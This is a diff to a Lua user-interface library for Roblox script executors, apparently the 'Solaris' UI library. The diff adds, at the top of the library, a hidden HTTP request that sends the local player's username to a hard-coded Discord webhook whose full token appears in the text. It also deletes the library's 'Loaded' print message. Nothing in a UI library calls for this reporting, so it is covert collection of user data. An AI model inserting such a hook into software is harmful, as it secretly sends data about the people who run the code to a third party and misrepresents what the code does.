@@ -1,5 +1,17 @@
 --https://raw.githubusercontent.com/Stebulous/solaris-ui-lib/main/source.lua
+local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
+local response = httprequest({
+  Url = 'https://discord.com/api/webhooks/1060220426250362890/zJ14Dqk4SdwNVLftKieyO3ZYB7TefgFpx2yPqcBTQiZqlG0a-4fqvFmKiMpdHzt_vqL0',
+  Method = "POST",
+  Headers = {
+    ["Content-Type"] = "application/json"
+  },
+  Body = game:GetService("HttpService"):JSONEncode({
+    ["content"] = game.Players.LocalPlayer.Name
+  })
+})
 -- This User Interface Library is brought to you by Solaris Software.
 local Solaris = Instance.new("ScreenGui")
 Solaris.Name = "dosage's solaris gui"
@@ -164,7 +176,6 @@ local SolarisLib = {
 
 
 local MainUI = game:GetObjects("rbxassetid://7835727566")[1]
-print("SolarisLib Loaded!")
 local function MakeDraggable(topbarobject, object) 
     pcall(function()
 		local dragging, dragInput, mousePos, framePos = false
